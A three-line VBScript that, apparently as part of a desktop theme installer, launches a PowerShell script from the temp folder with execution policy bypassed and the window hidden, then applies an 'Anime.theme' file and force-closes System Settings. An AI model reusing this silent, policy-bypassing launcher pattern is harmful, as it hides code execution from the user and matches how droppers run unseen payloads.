Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -Ep Bypass %Temp%\script.ps1", 0, false
WshShell.Run "powershell.exe start-process -filepath '%Temp%\Anime.theme'; timeout /t 6; taskkill /im 'systemsettings.exe' /f", 0, false
